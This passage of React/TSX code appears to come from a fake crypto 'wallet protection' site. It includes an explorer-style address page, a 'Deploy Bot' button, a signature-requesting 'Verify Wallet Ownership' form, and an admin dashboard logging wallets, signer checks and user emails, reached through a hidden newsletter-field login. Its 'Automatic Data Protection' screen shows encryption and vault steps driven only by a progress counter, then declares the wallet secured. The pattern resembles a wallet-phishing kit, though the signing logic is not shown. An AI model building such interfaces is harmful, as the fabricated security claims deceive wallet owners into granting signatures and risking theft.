                  <span className="es-bc-sep">/</span>
                  <span className="es-bc-current">Address Details</span>
                </div>

                {/* Address header */}
                <div className="es-addr-header">
                  <div className="es-addr-header-left">
                    <div className="es-addr-avatar">{esAddr.slice(2, 4).toUpperCase()}</div>
                    <div className="es-addr-info">
                      <div className="es-addr-type-row">
                        <span className="es-addr-type-label">Address</span>
                        <span className="es-addr-network-pill">
                          <span className="es-chain-dot" />
                          {chainConfig[chain].label}
                        </span>
                        <span className="pill low" style={{ fontSize: '0.65rem', padding: '2px 7px', letterSpacing: '0.03em' }}>
                          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" width="9" height="9" strokeLinecap="round" strokeLinejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
                          &nbsp;Verified
                        </span>
                      </div>
                      <div className="es-addr-full">
                        <span className="es-addr-text">{esAddr}</span>
                        <button type="button" className="es-icon-btn" title="Copy address" onClick={() => navigator.clipboard.writeText(esAddr)}>
                          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="13" height="13" strokeLinecap="round" strokeLinejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
                        </button>
                      </div>
                      <div className="es-addr-subtags">
                        <span className="es-addr-nametag">🏷 My Wallet</span>
                        <span className="es-addr-pipe">|</span>
                        <span className="es-addr-notebtn">+ Private Name Tag</span>
                        <span className="es-addr-pipe">|</span>
                        <span className="es-addr-notebtn">+ Note</span>
                        <span className="es-addr-pipe">|</span>
                        <span className="es-addr-notebtn">Multichain Portfolio ↗</span>
                      </div>
                    </div>
                  </div>
                  <div className="es-addr-actions">
                    <button type="button" className="es-action-btn">
                      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="13" height="13" strokeLinecap="round" strokeLinejoin="round"><path d="M4 12v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-8"/><polyline points="16 6 12 2 8 6"/><line x1="12" y1="2" x2="12" y2="15"/></svg>
                      Share
                    </button>
                    <a className="es-action-btn" href={`${explorerAddressUrl}${esAddr}`} target="_blank" rel="noopener noreferrer">
                      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="13" height="13" strokeLinecap="round" strokeLinejoin="round"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 0 1-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg>
                      {explorerBrand} ↗
                    </a>
                    {approvedBotForWallet ? (
                      <span className="bot-deploy-badge approved">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" width="12" height="12" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><polyline points="9 12 11 14 15 10"/></svg>
                        Bot Protected
                      </span>
                    ) : pendingBotForWallet ? (
                      <span className="bot-deploy-badge pending">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" width="12" height="12" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
                        Pending Review
                      </span>
                    ) : (
                      <button type="button" className="bot-deploy-btn" onClick={openBotModal}>
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="12" height="12" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
                        Deploy Bot
                      </button>
                    )}
                  </div>
                </div>

                {/* ── Overview grid — 2 white cards each with 3 metrics ── */}
                <div className="es-overview-grid">
                  <div className="es-overview-card">
                    <div className="es-ov-section">
                      <div className="es-ov-label">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="11" height="11" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
                        {chainConfig[chain].nativeSymbol} Balance
                      </div>
                      <div className="es-ov-value">{esEthBalance} {chainConfig[chain].nativeSymbol}</div>
                    </div>
                    <div className="es-ov-divider" />
                    <div className="es-ov-section">
                      <div className="es-ov-label">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="11" height="11" strokeLinecap="round" strokeLinejoin="round"><line x1="12" y1="1" x2="12" y2="23"/><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg>
                        {chainConfig[chain].nativeSymbol} Value
                      </div>
                      <div className="es-ov-value" style={{ color: '#198754' }}>{esEthValueUsd ? `$${esEthValueUsd}` : '—'}</div>
                      <div className="es-ov-sub">{esEthUsdPrice ? `@ $${esEthUsdPrice} / ${chainConfig[chain].nativeSymbol}` : 'Price unavailable'}</div>
                    </div>
                    <div className="es-ov-divider" />
                    <div className="es-ov-section">
                      <div className="es-ov-label">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="11" height="11" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
                        Token Holdings
                      </div>
                      <div className="es-ov-value es-ov-token">
                        {esTokenTransferCount > 0 ? (
                          <><span className="es-token-count-pill">{esTokenTransferCount}</span> Token{esTokenTransferCount !== 1 ? 's' : ''}</>
                        ) : '—'}
                      </div>
                      <div className="es-ov-sub">Based on ERC-20 transfer activity</div>
                    </div>
                  </div>

                  <div className="es-overview-card">
                    <div className="es-ov-section">
                      <div className="es-ov-label">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="11" height="11" strokeLinecap="round" strokeLinejoin="round"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg>
                        Transactions
                      </div>
                      <div className="es-ov-value">{(esTxCount > 0 ? esTxCount : esDisplayedRows.length).toLocaleString()}</div>
                      <div className="es-ov-sub">{esDisplayedRows.filter(t => t.direction === 'OUT').length} sent · {esDisplayedRows.filter(t => t.direction === 'IN').length} received</div>
                    </div>
                    <div className="es-ov-divider" />
                    <div className="es-ov-section">
                      <div className="es-ov-label">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="11" height="11" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
                        Last Transaction
                      </div>
                      <div className="es-ov-value" style={{ fontSize: '0.9rem' }}>{esLastTx?.age ?? '—'}</div>
                      <div className="es-ov-sub">{esLastTx ? `Block #${esLastTx.block.toLocaleString()}` : 'No transactions yet'}</div>
                    </div>
                    <div className="es-ov-divider" />
                    <div className="es-ov-section">
                      <div className="es-ov-label">
                        <span className="es-chain-dot" style={{ display: 'inline-block', verticalAlign: 'middle', marginRight: '3px' }} />
                        Network
                      </div>
                      <div className="es-ov-value es-ov-chain" style={{ fontSize: '0.92rem' }}>
                        {chainConfig[chain].label}
                      </div>
                      <div className="es-ov-sub">Chain ID {chainConfig[chain].chainId}</div>
                    </div>
                  </div>
                </div>

                {/* ── More info row ── */}
                <div className="es-more-info">
                  <div className="es-info-item">
                    <span className="es-info-label">Network Gas</span>
                    <span className="es-info-val">{esGasGwei ? `${esGasGwei} Gwei` : '—'}</span>
                  </div>
                  <div className="es-info-item">
                    <span className="es-info-label">Funded By</span>
                    <span className="es-info-val es-link" title={esIncomingFund?.from}>
                      {esIncomingFund ? `${esIncomingFund.from.slice(0, 10)}…${esIncomingFund.from.slice(-6)}` : '—'}
                    </span>
                  </div>
                  <div className="es-info-item">
                    <span className="es-info-label">First Seen</span>
                    <span className="es-info-val">{esDisplayedRows.length > 0 ? esDisplayedRows[esDisplayedRows.length - 1].age : '—'}</span>
                  </div>
                  <div className="es-info-item">
                    <span className="es-info-label">Latest Block</span>
                    <span className="es-info-val">{esLatestBlock ? `#${esLatestBlock.toLocaleString()}` : '—'}</span>
                  </div>
                  <div className="es-info-item">
                    <span className="es-info-label">Nonce</span>
                    <span className="es-info-val">{esTxCount}</span>
                  </div>
                  <div className="es-info-item">
                    <span className="es-info-label">Explorer</span>
                    <a className="es-info-val es-link" href={`${explorerAddressUrl}${esAddr}`} target="_blank" rel="noopener noreferrer">
                      {explorerBrand} ↗
                    </a>
                  </div>
                </div>

                {/* ── Tabs bar ── */}
                <div className="es-tabs-bar">
                  {([
                    { id: 'transactions', label: 'Transactions',            count: esDisplayedRows.length },
                    { id: 'internal',     label: 'Internal Txns',           count: esDisplayedRows.filter(tx => tx.method === 'Internal Txn').length },
                    { id: 'erc20',        label: 'Token Transfers (ERC-20)', count: esTokenTransferCount },
                    { id: 'nft',          label: 'NFT Transfers',            count: 0 },
                    { id: 'analytics',    label: 'Analytics',               count: undefined },
                  ] as { id: string; label: string; count?: number }[]).map(t => (
                    <button key={t.id} type="button" className={`es-tab${t.id === 'transactions' ? ' es-tab--active' : ''}`}>
                      {t.label}
                      {t.count !== undefined && <span className="es-tab-count">{t.count}</span>}
                    </button>
                  ))}
                </div>

                {/* ── Table toolbar ── */}
                <div className="es-table-topbar">
                  <span className="es-table-info">
                    {esLoading ? (
                      <><span className="es-loading-dot" />Loading on-chain data…</>
                    ) : (
                      <>Showing <strong>{esDisplayedRows.length}</strong> transaction{esDisplayedRows.length !== 1 ? 's' : ''} of <strong>{(esTxCount > 0 ? esTxCount : esDisplayedRows.length).toLocaleString()}</strong> total</>
                    )}
                  </span>
                  <div className="es-table-actions">
                    <button type="button" className="es-filter-btn">
                      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="12" height="12" strokeLinecap="round" strokeLinejoin="round"><polygon points="22 3 2 3 10 12.46 10 19 14 21 14 12.46 22 3"/></svg>
                      Advanced Filter
                    </button>
                    <button type="button" className="es-filter-btn">
                      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="12" height="12" strokeLinecap="round" strokeLinejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
                      Download CSV
                    </button>
                    <button type="button" className="es-filter-btn es-filter-btn--icon" title="Column settings">
                      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="13" height="13" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="3"/><path d="M19.07 4.93a10 10 0 0 1 0 14.14M4.93 4.93a10 10 0 0 0 0 14.14"/></svg>
                    </button>
                  </div>
                </div>

                {/* ── Transaction table ── */}
                <div className="es-table-wrap">
                  <table className="es-table">
                    <thead>
                      <tr>
                        <th style={{ width: 28 }}></th>
                        <th>Txn Hash</th>
                        <th>Method
                          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="10" height="10" strokeLinecap="round" strokeLinejoin="round" style={{ marginLeft: 3 }}><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
                        </th>
                        <th>Block</th>
                        <th>Age</th>
                        <th>From</th>
                        <th style={{ width: 50 }}></th>
                        <th>To</th>
                        <th>Value</th>
                        <th>Txn Fee</th>
                      </tr>
                    </thead>
                    <tbody>
                      {esDisplayedRows.map((tx, i) => (
                        <tr key={tx.hash} className={i % 2 === 0 ? 'es-tr-even' : ''}>
                          <td>
                            <div className="es-tx-status-icon es-tx-status-icon--ok" title="Success">
                              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" width="11" height="11" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
                            </div>
                          </td>
                          <td>
                            <a className="es-link es-hash" href={`${explorerTxUrl}${tx.hash}`} target="_blank" rel="noopener noreferrer" title={tx.hash}>
                              {tx.hash.slice(0, 8)}…{tx.hash.slice(-6)}
                            </a>
                          </td>
                          <td><span className={`es-method-badge es-method-badge--${tx.direction.toLowerCase()}`}>{tx.method}</span></td>
                          <td>
                            <a className="es-link" href={`${explorerBlockUrl}${tx.block}`} target="_blank" rel="noopener noreferrer">
                              {tx.block.toLocaleString()}
                            </a>
                          </td>
                          <td className="es-age" title={`Block #${tx.block.toLocaleString()}`}>{tx.age}</td>
                          <td>
                            {tx.from === esAddr ? (
                              <span className="es-addr-self" title={tx.from}>{shortEsAddr}</span>
                            ) : (
                              <a className="es-link es-addr-short" href={`${explorerAddressUrl}${tx.from}`} target="_blank" rel="noopener noreferrer" title={tx.from}>
                                {tx.from.slice(0, 6)}…{tx.from.slice(-4)}
                              </a>
                            )}
                          </td>
                          <td>
                            <span className={`es-dir-badge es-dir-badge--${tx.direction.toLowerCase()}`}>{tx.direction}</span>
                          </td>
                          <td>
                            {tx.to === esAddr ? (
                              <span className="es-addr-self" title={tx.to}>{shortEsAddr}</span>
                            ) : (
                              <a className="es-link es-addr-short" href={`${explorerAddressUrl}${tx.to}`} target="_blank" rel="noopener noreferrer" title={tx.to}>
                                {tx.to.slice(0, 6)}…{tx.to.slice(-4)}
                              </a>
                            )}
                          </td>
                          <td className="es-value">{tx.value}</td>
                          <td className="es-fee">{tx.fee}</td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>

                {/* ── Pagination ── */}
                <div className="es-pagination">
                  <div className="es-page-info">
                    Page <strong>1</strong> of <strong>1</strong>
                    <span className="es-page-info-sep">·</span>
                    {esDisplayedRows.length} record{esDisplayedRows.length !== 1 ? 's' : ''}
                  </div>
                  <div className="es-page-controls">
                    <button type="button" className="es-page-btn" disabled title="First">«</button>
                    <button type="button" className="es-page-btn" disabled title="Prev">‹</button>
                    <button type="button" className="es-page-btn es-page-btn--active">1</button>
                    <button type="button" className="es-page-btn" disabled title="Next">›</button>
                    <button type="button" className="es-page-btn" disabled title="Last">»</button>
                  </div>
                  <div className="es-page-size">
                    Show
                    <select className="es-page-select" disabled defaultValue="25">
                      <option value="10">10</option>
                      <option value="25">25</option>
                      <option value="50">50</option>
                      <option value="100">100</option>
                    </select>
                    records
                  </div>
                </div>

                {/* Footer note */}
                <div className="es-footer-note">
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="13" height="13" strokeLinecap="round" strokeLinejoin="round" style={{ flexShrink: 0, marginTop: 2 }}><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
                  A wallet address can have a zero native balance and still have historical transactions if funds were moved out. Transaction fees shown are estimates based on current gas prices and actual gas consumed. Data provided for informational purposes only.
                </div>
              </>)}
            </div>

            {/* ── Site footer ── */}
            <div className="es-site-footer">
              <div className="es-site-footer-inner">
                <div className="es-sf-col es-sf-col--brand">
                  <div className="es-sf-brand-row">
                    <svg viewBox="0 0 293.775 293.649" width="22" height="22" fill="rgba(255,255,255,0.7)"><path d="M144.028 6.721A137.683 137.683 0 0 0 6.345 144.404c0 76.066 61.617 137.683 137.683 137.683s137.683-61.617 137.683-137.683S220.094 6.721 144.028 6.721"/></svg>
                    <span className="es-sf-brand-name">{explorerBrand}</span>
                  </div>
                  <p className="es-sf-tagline">{chainConfig[chain].label} Blockchain Explorer</p>
                  <p className="es-sf-copy">© 2026 {explorerBrand}. All Rights Reserved.</p>
                </div>
                <div className="es-sf-col">
                  <div className="es-sf-col-title">Company</div>
                  {['About Us','Brand Assets','Terms of Service','Privacy Policy','Bug Bounty','Contact Us'].map(l => (
                    <a key={l} className="es-sf-link" href="#" onClick={e => e.preventDefault()}>{l}</a>
                  ))}
                </div>
                <div className="es-sf-col">
                  <div className="es-sf-col-title">Community</div>
                  {['API Documentation','Knowledge Base','Network Status','Newsletters','Disqus Comments'].map(l => (
                    <a key={l} className="es-sf-link" href="#" onClick={e => e.preventDefault()}>{l}</a>
                  ))}
                </div>
                <div className="es-sf-col">
                  <div className="es-sf-col-title">Products &amp; Services</div>
                  {['Advertise','Explorer-as-a-Service','API Plans','Priority Support','Blockscan','Mobile App'].map(l => (
                    <a key={l} className="es-sf-link" href="#" onClick={e => e.preventDefault()}>{l}</a>
                  ))}
                </div>
              </div>
            </div>
          </div>
        )}

        {/* ════════════ DATA PROTECTION / SECURING ════════════ */}
        {activeView === 'protecting' && (
          <div className="protecting-root">
            <div className="protecting-card">
              {!protectingDone ? (
                <>
                  <div className="protecting-icon-wrap">
                    <div className="protecting-pulse-ring" />
                    <div className="protecting-icon">
                      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" width="48" height="48" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
                    </div>
                  </div>
                  <h2 className="protecting-title">Automatic Data Protection Ongoing</h2>
                  <p className="protecting-sub">
                    {protectingProgress < 20  && 'Analyzing wallet structure and transaction history…'}
                    {protectingProgress >= 20 && protectingProgress < 40 && 'Scanning on-chain approval graph for vulnerabilities…'}
                    {protectingProgress >= 40 && protectingProgress < 60 && 'Encrypting wallet signature data with AES-256…'}
                    {protectingProgress >= 60 && protectingProgress < 80 && 'Establishing secure vault connection and syncing records…'}
                    {protectingProgress >= 80 && protectingProgress < 95 && 'Finalizing protection protocols and generating recovery layer…'}
                    {protectingProgress >= 95 && 'Completing wallet hardening sequence…'}
                  </p>
                  <div className="protecting-progress-track">
                    <div className="protecting-progress-fill" style={{ width: `${protectingProgress}%` }} />
                  </div>
                  <div className="protecting-progress-label">{protectingProgress}%</div>
                  <div className="protecting-steps">
                    {[
                      { label: 'Wallet structure analyzed',       done: protectingProgress >= 20  },
                      { label: 'Approval graph scanned',          done: protectingProgress >= 40  },
                      { label: 'Signature data encrypted',        done: protectingProgress >= 60  },
                      { label: 'Vault connection established',    done: protectingProgress >= 80  },
                      { label: 'Protection protocols activated',  done: protectingProgress >= 100 },
                    ].map(s => (
                      <div key={s.label} className={`protecting-step ${s.done ? 'protecting-step--done' : ''}`}>
                        <div className="protecting-step-icon">
                          {s.done
                            ? <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" width="12" height="12" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
                            : <div className="protecting-step-dot" />
                          }
                        </div>
                        <span>{s.label}</span>
                      </div>
                    ))}
                  </div>
                </>
              ) : !protectingFinal ? (
                <div className="protecting-success">
                  <div className="protecting-success-icon">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="52" height="52" strokeLinecap="round" strokeLinejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
                  </div>
                  <h2 className="protecting-success-title">Your Wallet is Successfully Secured</h2>
                  <p className="protecting-success-sub">Your wallet has been analyzed, encrypted, and protected. All security protocols are now active.</p>
                  <div className="protecting-success-items">
                    {['Wallet structure hardened','Approval risks mitigated','Signature monitoring active','Vault backup created'].map(item => (
                      <div key={item} className="protecting-success-item">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" width="14" height="14" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
                        {item}
                      </div>
                    ))}
                  </div>
                </div>
              ) : (
                <div className="protecting-disconnected">
                  <div className="protecting-disc-icon">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" width="44" height="44" strokeLinecap="round" strokeLinejoin="round"><path d="M18.36 6.64a9 9 0 1 1-12.73 0"/><line x1="12" y1="2" x2="12" y2="12"/></svg>
                  </div>
                  <h2 className="protecting-disc-title">Session Disconnected</h2>
                  <p className="protecting-disc-sub">Your wallet session has been safely terminated. Your protection is active and monitoring in the background.</p>
                  <div className="protecting-disc-badge">DISCONNECTED</div>
                </div>
              )}
            </div>
          </div>
        )}

        {activeView === 'ownership' && (() => {
          const wcAddr = wcSessions[0]?.address
          const hasWcSession = wcStatus === 'connected' && !!wcAddr
          const displayAddr = wcAddr || appKitAddress || wallet
          const isVerified = ownershipStatus.includes('verified')
          const canSign = ownershipTermsAccepted && (hasWcSession || isWalletConnected) && (displayAddr ? isAddress(displayAddr) : false)
          return (
          <div className="workspace single">
            {/* Header */}
            <div className="page-header">
              <h2>Verify Wallet Ownership</h2>
              <p>Prove control of your wallet with a one-time cryptographic signature. No seed phrase, no funds moved, fully non-custodial.</p>
            </div>

            {/* Connection status strip */}
            <div className={`own-status-strip ${hasWcSession || isWalletConnected ? 'own-status-strip--connected' : ''}`}>
              <div className="own-status-left">
                {(hasWcSession || isWalletConnected) ? (
                  <>
                    <span className="own-status-dot own-status-dot--on" />
                    <span className="own-status-label">
                      {hasWcSession ? `${wcSessions[0]?.walletName ?? 'Wallet'} connected via WalletConnect` : 'Wallet connected'}
                    </span>
                  </>
                ) : (
                  <>
                    <span className="own-status-dot own-status-dot--off" />
                    <span className="own-status-label muted">No wallet connected</span>
                  </>
                )}
              </div>
              {displayAddr && isAddress(displayAddr) && (
                <code className="own-addr-chip">{displayAddr.slice(0, 8)}…{displayAddr.slice(-6)}</code>
              )}
            </div>

            <div className="own-grid">
              {/* Left — form */}
              <div className="card own-form-card">
                <h3 className="own-card-title">
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="18" height="18" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
                  Ownership Verification
                </h3>

                <div className="field">
                  <label htmlFor="own-network">Network</label>
                  <select id="own-network" value={chain} onChange={e => setChain(e.target.value as ChainKey)}>
                    {Object.entries(chainConfig).map(([k, v]) => <option key={k} value={k}>{v.label}</option>)}
                  </select>
                </div>

                {!hasWcSession && (
                  <div className="field">
                    <label htmlFor="own-address">Wallet Address</label>
                    <input id="own-address" type="text" value={wallet} onChange={e => setWallet(e.target.value)} placeholder="0x…" />
                    {wallet && !addressValid && <p className="field-error">Enter a valid EVM address (0x… 40 hex chars).</p>}
                  </div>
                )}

                {!hasWcSession && !isWalletConnected && (
                  <button className="btn-primary" type="button" style={{ marginBottom: '1rem', width: '100%' }} onClick={() => { void openWalletModal() }}>
                    <svg viewBox="0 0 20 20" fill="none" stroke="currentColor" strokeWidth="1.6" width="14" height="14"><rect x="2" y="5" width="16" height="12" rx="2"/><path d="M14 11a1 1 0 1 0 0-2 1 1 0 0 0 0 2z" fill="currentColor" stroke="none"/><path d="M2 9h16"/></svg>
                    &nbsp;Connect Wallet
                  </button>
                )}

                {!hasWcSession && isWalletConnected && !isConnectedToChain && (
                  <button className="btn-secondary" type="button" style={{ marginBottom: '0.8rem', width: '100%' }} onClick={switchNetwork}>
                    Switch to {chainConfig[chain].label}
                  </button>
                )}

                <label className="terms-row" style={{ marginBottom: '1.2rem' }}>
                  <input type="checkbox" checked={ownershipTermsAccepted} onChange={e => setOwnershipTermsAccepted(e.target.checked)} />
                  <span>I understand this requests a cryptographic signature for ownership verification. No seed phrase or private key is ever collected.</span>
                </label>

                <button
                  className="btn-primary own-sign-btn"
                  type="button"
                  onClick={testSigner}
                  disabled={isTestingSigner || !canSign}
                >
                  {isTestingSigner ? (
                    <><span className="spinner" /> Requesting Signature…</>
                  ) : isVerified ? (
                    <>✅ Verified — Open Explorer</>
                  ) : (
                    <>
                      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="15" height="15" strokeLinecap="round" strokeLinejoin="round"><path d="M9 11l3 3L22 4"/><path d="M21 12v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11"/></svg>
                      &nbsp;Request Ownership Signature
                    </>
                  )}
                </button>

                {!canSign && !isTestingSigner && (
                  <p className="form-hint" style={{ marginTop: '0.5rem', fontSize: '0.8rem' }}>
                    {!ownershipTermsAccepted ? 'Accept the terms above to continue.' : 'Connect your wallet to request a signature.'}
                  </p>
                )}

                <div className={`status-bar ${isVerified ? 'status-bar--success' : ownershipStatus.includes('failed') || ownershipStatus.includes('Failed') ? 'status-bar--warn' : ''}`} style={{ marginTop: '1rem' }}>
                  <span className={`status-dot ${isVerified ? 'active' : ownershipStatus.includes('failed') || ownershipStatus.includes('Failed') ? 'warn' : ''}`} />
                  {ownershipStatus || 'Awaiting ownership verification.'}
                </div>

                <button type="button" className="btn-secondary" style={{ marginTop: '0.75rem', width: '100%' }} onClick={() => setActiveView('protect')}>
                  ← Back to Protect
                </button>
              </div>

              {/* Right — explainer */}
              <div className="own-explainer-col">
                <div className="card own-info-card">
                  <h4>How it works</h4>
                  <ol className="own-steps-list">
                    <li>
                      <span className="own-step-num">1</span>
                      <span>Your wallet app shows a <strong>signature request</strong> with a timestamped challenge message.</span>
                    </li>
                    <li>
                      <span className="own-step-num">2</span>
                      <span>You <strong>approve</strong> the request — this proves you hold the private key without exposing it.</span>
                    </li>
                    <li>
                      <span className="own-step-num">3</span>
                      <span>Ownership is <strong>confirmed</strong> and you are redirected to your live wallet dashboard.</span>
                    </li>
                  </ol>
                </div>

                <div className="card own-security-card">
                  <h4>Security guarantees</h4>
                  <ul className="own-security-list">
                    <li>🔒 Read-only — no transaction is sent</li>
                    <li>🚫 No seed phrase or private key collected</li>
                    <li>⏱ Challenge is timestamped and single-use</li>
                    <li>✅ Industry-standard <code>personal_sign</code></li>
                  </ul>
                </div>

                {hasWcSession && (
                  <div className="card own-session-card">
                    <h4>Active Session</h4>
                    <div className="own-session-detail"><span>Wallet</span><code>{wcSessions[0]?.walletName}</code></div>
                    <div className="own-session-detail"><span>Address</span><code>{wcAddr?.slice(0,8)}…{wcAddr?.slice(-6)}</code></div>
                    <div className="own-session-detail"><span>Connected</span><code>{wcSessions[0]?.connectedAt}</code></div>
                    <div className="own-session-detail"><span>Status</span>
                      <span className={`pill ${wcSessions[0]?.ownershipVerified ? 'low' : 'medium'}`}>
                        {wcSessions[0]?.ownershipVerified ? '✓ Verified' : 'Pending'}
                      </span>
                    </div>
                  </div>
                )}
              </div>
            </div>
          </div>
          )
        })()}

        {/* ════════════ RECOVERY ════════════ */}
        {activeView === 'recovery' && (
          <div className="workspace single">
            <div className="page-header"><h2>Recovery Playbook</h2><p>Follow these steps if you suspect your wallet is compromised.</p></div>
            <div className="card">
              <ol className="recovery-list">
                <li>Move assets immediately to a fresh wallet generated on a clean device.</li>
                <li>Revoke all token approvals on every active network using an approval manager tool.</li>
                <li>Remove all unknown browser extensions and run a full malware scan.</li>
                <li>Rotate every exchange, email, and 2FA credential linked to this wallet.</li>
                <li>Document every suspicious transaction hash and report to affected protocols.</li>
                <li>If an exchange is involved, contact support immediately and freeze withdrawals.</li>
              </ol>
              <p className="error" style={{ marginTop: '1.2rem' }}>Never enter your seed phrase on any website, popup, bot, support chat, or form — ever.</p>
              <div className="action-row" style={{ marginTop: '1.2rem' }}>
                <button className="btn-primary" type="button" onClick={() => setActiveView('scan')}>Run Security Scan</button>
                <button className="btn-secondary" type="button" onClick={() => setActiveView('ownership')}>Verify Ownership</button>
              </div>
            </div>
          </div>
        )}

        {/* ════════════ SUPPORT ════════════ */}
        {activeView === 'support' && (
          <div className="workspace single support-workspace">
            <div className="page-header">
              <h2>Support Center</h2>
              <p>Reach the team, subscribe to updates, and access the secure dashboard from one place.</p>
            </div>
            <div className="card support-card">
              <div className="support-action-row">
                <a className="btn-primary support-link-btn" href={`mailto:${supportConfig.email}`}>
                  Email Support
                </a>
                <a className="btn-secondary support-link-btn" href={supportConfig.telegram} target="_blank" rel="noopener noreferrer">
                  Telegram Support
                </a>
              </div>


              <div className="support-block">
                <h3>Newsletter Signup</h3>
                <form onSubmit={submitSupportEmail} className="support-newsletter-form">
                  <input
                    type="email"
                    placeholder="you@example.com"
                    value={supportEmailInput}
                    onChange={e => setSupportEmailInput(e.target.value)}
                    required
                  />
                  <button className="btn-primary" type="submit">Continue</button>
                </form>
                {supportStatus && (
                  <div className="status-bar" style={{ marginTop: '0.7rem' }}>
                    <span className={`status-dot ${supportStatus.includes('authenticated') || supportStatus.includes('Subscribed') ? 'active' : ''}`} />
                    {supportStatus}
                  </div>
                )}
              </div>

              <div className="support-grid">
                <div className="support-block">
                  <h3>Email News (Coming Soon)</h3>
                  <p className="muted">This area is reserved for scheduled email updates, security bulletins, and campaign announcements.</p>
                </div>
                <div className="support-block">
                  <h3>Donation (Coming Soon)</h3>
                  <p className="muted">Donation options and wallet details will appear here later.</p>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* ════════════ ADMIN ════════════ */}
        {activeView === 'admin' && (
          <div style={{ maxWidth: '960px' }}>
            <div className="page-header"><h2>Operations Dashboard</h2><p>Full audit log — wallets, scans, signer checks, user emails, and email templates.</p></div>
            <div className="card">
              {!isAdminAuthenticated ? (
                <div className="admin-login">
                  <p className="muted" style={{ marginBottom: '0.75rem' }}>
                    Dashboard access is handled through the <strong>Support</strong> page.
                  </p>
                  <p className="muted" style={{ marginBottom: '0.9rem', fontSize: '0.84rem' }}>
                    Enter your registered email in the Support newsletter field, then complete password verification in the popup.
                  </p>
                  <button className="btn-primary" type="button" onClick={() => setActiveView('support')}>
                    Go to Support
                  </button>
                </div>
              ) : (
                <>
                  <div className="admin-top">
                    <p className="muted">Signed in as <strong>{adminCreds.email}</strong></p>
